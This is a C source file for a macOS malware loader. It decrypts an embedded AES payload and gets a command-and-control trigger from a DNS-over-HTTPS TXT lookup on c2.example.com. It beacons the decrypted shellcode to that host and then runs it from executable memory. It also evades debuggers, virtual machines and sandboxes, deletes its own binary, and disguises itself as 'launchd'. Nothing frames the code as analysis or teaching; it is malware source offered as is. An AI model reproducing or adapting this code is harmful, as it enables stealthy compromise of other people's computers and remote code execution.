#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <CommonCrypto/CommonCryptor.h>
#include <CommonCrypto/CommonKeyDerivation.h>
#include <curl/curl.h>
#include "junk.h"  // Generated per build

unsigned char encrypted_payload[] = "__ENCRYPTED_PAYLOAD__";
unsigned char fixed_salt[] = "__FIXED_SALT__";
unsigned char iv[] = "__IV__";
unsigned char base_key[] = "__BASE_KEY__";
size_t payload_len = sizeof(encrypted_payload);

// Feature flags
int flag_no_doh = 0;
int flag_no_selfdelete = 0;
int flag_fallback_only = 0;

// XOR key for in-memory encryption
unsigned char xor_key = 0xAA;

// Decrypt payload
void decrypt_payload(unsigned char *decrypted_payload) {
    unsigned char derived_key[32];
    CCCryptorStatus status = CCCryptorHKDF(kCCPRFHmacAlgSHA256, base_key, sizeof(base_key) - 1, fixed_salt, sizeof(fixed_salt) - 1, NULL, 0, derived_key, sizeof(derived_key));
    if (status != kCCSuccess) exit(1);

    JUNK_ASM;

    size_t dataOutMoved;
    status = CCCrypt(kCCDecrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding, derived_key, kCCKeySizeAES256, iv, encrypted_payload, payload_len, decrypted_payload, payload_len, &dataOutMoved);
    if (status != kCCSuccess) exit(1);
}

// XOR encrypt/decrypt in memory
void xor_memory(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// DNS-over-HTTPS C2 trigger
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t total = size * nmemb;
    char *ptr = malloc(total + 1);
    if (!ptr) return 0;
    memcpy(ptr, contents, total);
    ptr[total] = '\0';
    *(char **)userp = ptr;
    return total;
}

int doh_c2_trigger() {
    if (flag_no_doh) return 0;
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    char *response = NULL;
    curl_easy_setopt(curl, CURLOPT_URL, "https://dns.google/resolve?name=c2.example.com&type=TXT");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl);
    int result = -1;
    if (res == CURLE_OK && response) {
        if (strstr(response, "\"C2_TRIGGER:1\"")) {
            result = 0;
        }
        free(response);
    }
    curl_easy_cleanup(curl);
    return result;
}

// Telemetry beacon (C2 callback)
void send_beacon(unsigned char *shellcode, size_t shellcode_len) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    // Base64 encode shellcode (simplified)
    char *base64_shellcode = malloc(((shellcode_len + 2) / 3) * 4 + 1);
    if (!base64_shellcode) return;
    int encoded_len = EVP_EncodeBlock((unsigned char *)base64_shellcode, shellcode, shellcode_len);
    base64_shellcode[encoded_len] = '\0';

    char host_header[64];
    snprintf(host_header, sizeof(host_header), "Host: %s", "c2.example.com");

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, host_header);
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");

    curl_easy_setopt(curl, CURLOPT_URL, "https://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, base64_shellcode);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(base64_shellcode);
}

// Execute payload (second-stage loader)
void exec_payload(unsigned char *decrypted_payload) {
    vm_address_t shellcode;
    mach_vm_allocate(mach_task_self(), &shellcode, payload_len, VM_FLAGS_ANYWHERE);
    memcpy((void *)shellcode, decrypted_payload, payload_len);
    mprotect((void *)shellcode, payload_len, PROT_READ | PROT_EXEC);
    ((void (*)())shellcode)();
}

// Anti-debug check
int is_debugged() {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc info;
    size_t size = sizeof(info);
    sysctl(mib, 4, &info, &size, NULL, 0);
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

// Anti-VM check
int is_vm() {
    char vendor[13];
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__ ("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx) : "a"(0));
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';
    if (!strcmp(vendor, "VMwareVMware") || !strcmp(vendor, "KVMKVMKVM")) return 1;

    int cpu_count;
    size_t len = sizeof(cpu_count);
    sysctlbyname("hw.ncpu", &cpu_count, &len, NULL, 0);
    return cpu_count < 2;
}

// Anti-sandbox timing
int is_sandbox() {
    struct timespec req = {0, 1000000}; // 1ms
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    nanosleep(&req, NULL);
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) * 1000.0 + (end.tv_nsec - start.tv_nsec) / 1000000.0;
    return elapsed < 0.5 || elapsed > 1.5;
}

// Self-delete
void self_delete() {
    if (flag_no_selfdelete) return;
    char path[1024];
    uint32_t size = sizeof(path);
    if (_NSGetExecutablePath(path, &size) == 0) {
        unlink(path);
    }
}

// Masquerade process
void spoof_process_name() {
    setprogname("launchd");
}

// Parse command-line flags
void parse_flags(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-doh") == 0) flag_no_doh = 1;
        else if (strcmp(argv[i], "--no-selfdelete") == 0) flag_no_selfdelete = 1;
        else if (strcmp(argv[i], "--fallback-only") == 0) flag_fallback_only = 1;
    }
}

int main(int argc, char **argv) {
    parse_flags(argc, argv);
    spoof_process_name();
    if (is_debugged() || is_sandbox() || is_vm()) exit(0);
    if (doh_c2_trigger() == 0) {
        printf("[*] C2 trigger successful\n");
    }
    unsigned char *decrypted_payload = malloc(payload_len);
    if (!decrypted_payload) exit(1);
    decrypt_payload(decrypted_payload);
    xor_memory(decrypted_payload, payload_len, xor_key);
    mprotect((void *)((uintptr_t)encrypted_payload & ~(getpagesize() - 1)), 
             ((payload_len + getpagesize() - 1) & ~(getpagesize() - 1)), PROT_NONE);
    send_beacon(decrypted_payload, payload_len);
    xor_memory(decrypted_payload, payload_len, xor_key);
    self_delete();
    if (!flag_fallback_only) {
        exec_payload(decrypted_payload);
    }
    free(decrypted_payload);
    return 0;
}
